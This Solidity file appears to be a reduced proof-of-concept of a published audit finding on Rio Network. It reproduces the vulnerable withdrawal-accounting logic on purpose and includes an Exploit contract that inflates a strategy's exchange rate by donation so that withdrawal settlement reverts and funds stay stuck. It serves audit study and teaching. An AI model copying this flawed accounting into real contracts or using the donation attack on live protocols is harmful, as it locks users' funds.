// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Rio Network — Requested withdrawal can be impossible to settle due to
    EigenLayer shares value appreciation when there are idle funds in the
    deposit pool (Sherlock 2024-02-rio-network-core-protocol, finding #30901,
    H-6, mstpr-brainbot)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. RioLRTCoordinator
    locks in a FIXED SHARE COUNT at requestWithdrawal() time (based on the THEN-
    CURRENT exchange rate). If the EigenLayer strategy's share value appreciates
    (e.g. via a direct donation) before the withdrawal is settled, the deposit
    pool's idle assets satisfy fewer of those originally-locked-in shares than
    expected, leaving a shortfall that operators cannot fully cover — and
    settlement reverts. The Exploit deploys a minimal strategy/pool/operator/
    coordinator stack, requests a withdrawal, inflates the strategy's exchange
    rate via a donation, and shows rebalance() (withdrawal settlement) reverts
    with INCORRECT_NUMBER_OF_SHARES_QUEUED even though the pool objectively
    holds MORE than enough VALUE to cover the withdrawal (no fork, no cheats).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: RioLRTCoordinator.requestWithdrawal()
    (restaking/RioLRTCoordinator.sol:L99-116, Rio Network) converts the
    withdrawal amount to a FIXED number of EigenLayer shares using the
    exchange rate AT REQUEST TIME, and records that share count as owed for
    the current epoch.

    At settlement (rebalance -> _processUserWithdrawalsForCurrentEpoch,
    RioLRTCoordinator.sol:L239-267), RioLRTDepositPool.transferMaxAssetsForShares()
    (RioLRTDepositPool.sol:L77-104) converts the pool's IDLE asset balance to
    shares using the CURRENT (possibly different) exchange rate to decide how
    many of the originally-owed shares it can satisfy. If the exchange rate
    APPRECIATED between request and settlement (an ordinary, expected event —
    EigenLayer strategy shares are ERC4626-like and should appreciate over
    time, and can also be pushed up faster by a direct donation), the SAME
    idle dollar amount now converts to FEWER shares — leaving a share
    shortfall that must be covered by operators.

    If operators do not hold enough REAL shares to cover that shortfall (a
    routine state whenever most funds are already deployed),
    OperatorOperations.queueTokenWithdrawalFromOperatorsForUserSettlement()
    (utils/OperatorOperations.sol:L113-134) reverts with
    INCORRECT_NUMBER_OF_SHARES_QUEUED — even though, in dollar terms, more
    than enough value exists to honor the withdrawal. The entire withdrawal
    epoch gets stuck.

    Recommended fix: the protocol team's own fix PR
    (https://github.com/rio-org/rio-sherlock-audit/pull/13) addressed this;
    in general, share-count accounting locked in at request time must be
    reconciled against rate changes at settlement time, not treated as a
    fixed, comparable quantity across the two.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC4626-like EigenLayer strategy stand-in. `donate()` models
///      a direct token transfer into the strategy (or ordinary yield
///      accrual) that inflates the share exchange rate WITHOUT minting new
///      shares — exactly what the report's own PoC does
///      (`MockERC20(CBETH_ADDRESS).transfer(address(cbETHStrategy), donate)`).
contract Strategy {
    uint256 public totalShares;
    uint256 public totalUnderlying;

    function deposit(uint256 assets) external returns (uint256 shares) {
        shares = totalShares == 0 ? assets : (assets * totalShares) / totalUnderlying;
        totalShares += shares;
        totalUnderlying += assets;
    }

    /// @notice Inflates the strategy's exchange rate without minting shares —
    ///         models yield accrual or a direct donation to the strategy.
    function donate(uint256 assets) external {
        totalUnderlying += assets;
    }

    function sharesToUnderlying(uint256 shares) external view returns (uint256) {
        if (totalShares == 0) return shares;
        return (shares * totalUnderlying) / totalShares;
    }

    function underlyingToShares(uint256 assets) external view returns (uint256) {
        if (totalUnderlying == 0) return assets;
        return (assets * totalShares) / totalUnderlying;
    }
}

/// @dev Reduced RioLRTAssetRegistry share/asset conversion surface. Faithful
///      reduction of restaking/RioLRTAssetRegistry.sol:L212-231 (Rio Network).
contract AssetRegistry {
    Strategy public strategy;

    constructor(address strategy_) {
        strategy = Strategy(strategy_);
    }

    function convertToSharesFromAsset(uint256 amount) public view returns (uint256) {
        return strategy.underlyingToShares(amount);
    }

    function convertFromSharesToAsset(uint256 shares) public view returns (uint256) {
        return strategy.sharesToUnderlying(shares);
    }
}

/// @dev Reduced RioLRTDepositPool. Faithful reduction of
///      restaking/RioLRTDepositPool.sol:L77-104 (Rio Network).
contract DepositPool {
    AssetRegistry public assetRegistry;
    uint256 public poolBalance; // idle asset balance sitting in the pool

    constructor(address assetRegistry_) {
        assetRegistry = AssetRegistry(assetRegistry_);
    }

    function receiveDeposit(uint256 amount) external {
        poolBalance += amount;
    }

    // ============================================================
    //  Vulnerable transferMaxAssetsForShares() — faithful reduction of
    //  restaking/RioLRTDepositPool.sol:L77-104 (Rio Network)
    // ============================================================
    function transferMaxAssetsForShares(uint256 sharesRequested) external returns (uint256 assetsSent, uint256 sharesSent) {
        uint256 poolBal = poolBalance;
        uint256 poolBalanceShareValue = assetRegistry.convertToSharesFromAsset(poolBal);

        if (poolBal == 0 || poolBalanceShareValue == 0) {
            return (0, 0);
        }

        if (poolBalanceShareValue >= sharesRequested) {
            uint256 assets = assetRegistry.convertFromSharesToAsset(sharesRequested);
            poolBalance -= assets;
            return (assets, sharesRequested);
        }

        // @> VULN: the pool cannot cover `sharesRequested`, so it sends its
        // ENTIRE idle balance and reports back `poolBalanceShareValue` shares
        // "sent" — computed at the CURRENT (possibly appreciated) exchange
        // rate. If the rate rose since `sharesRequested` was locked in at
        // requestWithdrawal() time, the SAME idle dollar amount now converts
        // to FEWER shares than it would have originally. RioLRTDepositPool.sol:L99-101.
        poolBalance = 0;
        return (poolBal, poolBalanceShareValue);
    }
}

/// @dev Reduced RioLRTOperatorRegistry share-deallocation surface. Faithful
///      reduction of the relevant slice of restaking/RioLRTOperatorRegistry.sol
///      (Rio Network) — allocation heap and multi-operator distribution are
///      omitted since they do not affect this bug (a single pool of REAL
///      shares, capped at whatever operators actually hold, is sufficient).
contract OperatorRegistry {
    uint256 public operatorShares; // total EigenLayer shares actually held by operators

    function allocate(uint256 shares) external {
        operatorShares += shares;
    }

    /// @notice Deallocates up to `sharesToWithdraw` REAL shares from
    ///         operators — capped at what they actually hold.
    function deallocateStrategyShares(uint256 sharesToWithdraw) external returns (uint256 sharesQueued) {
        sharesQueued = sharesToWithdraw < operatorShares ? sharesToWithdraw : operatorShares;
        operatorShares -= sharesQueued;
    }
}

/// @dev Reduced RioLRTCoordinator. Faithful reduction of
///      restaking/RioLRTCoordinator.sol:L99-116 (requestWithdrawal) and
///      L118-151 + L239-267 (rebalance / _processUserWithdrawalsForCurrentEpoch),
///      plus the revert condition from utils/OperatorOperations.sol:L113-134
///      (queueTokenWithdrawalFromOperatorsForUserSettlement).
contract Coordinator {
    error INCORRECT_NUMBER_OF_SHARES_QUEUED();

    AssetRegistry public assetRegistry;
    DepositPool public depositPool;
    OperatorRegistry public operatorRegistry;
    uint256 public sharesOwedCurrentEpoch;

    constructor(address assetRegistry_, address depositPool_, address operatorRegistry_) {
        assetRegistry = AssetRegistry(assetRegistry_);
        depositPool = DepositPool(depositPool_);
        operatorRegistry = OperatorRegistry(operatorRegistry_);
    }

    // ============================================================
    //  requestWithdrawal() — faithful reduction of
    //  restaking/RioLRTCoordinator.sol:L99-116 (Rio Network)
    // ============================================================
    function requestWithdrawal(uint256 assetAmount) external returns (uint256 sharesOwed) {
        // The withdrawal is locked in as a FIXED share count, valued at the
        // CURRENT exchange rate, at request time.
        sharesOwed = assetRegistry.convertToSharesFromAsset(assetAmount);
        sharesOwedCurrentEpoch += sharesOwed;
    }

    // ============================================================
    //  Vulnerable rebalance() — faithful reduction of
    //  restaking/RioLRTCoordinator.sol:L118-151 + L239-267 (Rio Network)
    // ============================================================
    function rebalance() external {
        uint256 sharesOwed = sharesOwedCurrentEpoch;
        if (sharesOwed == 0) return;

        (, uint256 sharesSent) = depositPool.transferMaxAssetsForShares(sharesOwed);
        uint256 sharesRemaining = sharesOwed - sharesSent;

        if (sharesRemaining == 0) {
            sharesOwedCurrentEpoch = 0;
            return;
        }

        // @> VULN: `sharesRemaining` is the ORIGINAL sharesOwed (locked in at
        // the OLD exchange rate) minus whatever the deposit pool could cover
        // at the NEW (appreciated) rate — the two legs are valued at
        // DIFFERENT rates, so the difference no longer corresponds to a
        // share count operators can necessarily supply.
        // RioLRTCoordinator.sol:L252 (sharesRemaining = sharesOwed - sharesSent).
        uint256 sharesQueued = operatorRegistry.deallocateStrategyShares(sharesRemaining);

        // OperatorOperations.sol:L131 — reverts if operators could not supply
        // exactly the requested share shortfall.
        if (sharesRemaining != sharesQueued) revert INCORRECT_NUMBER_OF_SHARES_QUEUED();

        sharesOwedCurrentEpoch = 0;
    }
}

/// @notice Orchestrator. Deploys the reduced Rio stack, has Alice deposit
///         5e18 into EigenLayer via an operator, has Bob deposit 100e18
///         (kept idle in the pool) and immediately request its withdrawal,
///         then donates 10,000e18 directly into the strategy to inflate the
///         exchange rate — and shows the withdrawal settlement reverts even
///         though the pool objectively holds far more value than owed.
///         Cheatcode-free.
contract Exploit {
    Strategy public strategy; // CREATE nonce 1
    AssetRegistry public assetRegistry; // CREATE nonce 2
    DepositPool public depositPool; // CREATE nonce 3
    OperatorRegistry public operatorRegistry; // CREATE nonce 4
    Coordinator public coordinator; // CREATE nonce 5

    uint256 internal constant ALICE_DEPOSIT = 5e18;
    uint256 internal constant BOB_DEPOSIT = 100e18;
    uint256 internal constant DONATION = 10_000e18;

    constructor() {
        strategy = new Strategy(); // nonce 1
        assetRegistry = new AssetRegistry(address(strategy)); // nonce 2
        depositPool = new DepositPool(address(assetRegistry)); // nonce 3
        operatorRegistry = new OperatorRegistry(); // nonce 4
        coordinator = new Coordinator(address(assetRegistry), address(depositPool), address(operatorRegistry)); // nonce 5

        // Alice deposits 5e18 and it is pushed into EigenLayer via an operator.
        uint256 aliceShares = strategy.deposit(ALICE_DEPOSIT);
        operatorRegistry.allocate(aliceShares);
    }

    function run() external {
        require(assetRegistry.convertFromSharesToAsset(1e18) == 1e18, "baseline rate should start 1:1");

        // === 1. Bob deposits 100e18 (kept idle in the pool) and immediately
        //        requests its full withdrawal, locking in sharesOwed at the
        //        CURRENT 1:1 rate. ===
        depositPool.receiveDeposit(BOB_DEPOSIT);
        uint256 sharesOwed = coordinator.requestWithdrawal(BOB_DEPOSIT);
        require(sharesOwed == BOB_DEPOSIT, "sharesOwed should be 100e18 at 1:1 rate");

        // === 2. The strategy's exchange rate appreciates via a donation —
        //        an ordinary, expected event for an ERC4626-like strategy. ===
        strategy.donate(DONATION);
        require(assetRegistry.convertFromSharesToAsset(1e18) > 1e18, "rate should have appreciated");

        // The pool still holds 100e18 of REAL value — objectively more than
        // enough to cover Bob's withdrawal in dollar terms.
        require(depositPool.poolBalance() == BOB_DEPOSIT, "pool should still hold the full 100e18");

        // === HARM: settlement reverts. The pool's 100e18 now converts to far
        //     FEWER than 100e18 shares at the new rate, and the operators
        //     (holding only Alice's 5e18 real shares) cannot supply the
        //     resulting shortfall. ===
        bool settlementReverted;
        try coordinator.rebalance() {
            // should not succeed
        } catch {
            settlementReverted = true;
        }
        require(settlementReverted, "harm not demonstrated: settlement should be stuck");
        require(coordinator.sharesOwedCurrentEpoch() == BOB_DEPOSIT, "Bob's withdrawal should remain stuck, unsettled");
    }
}
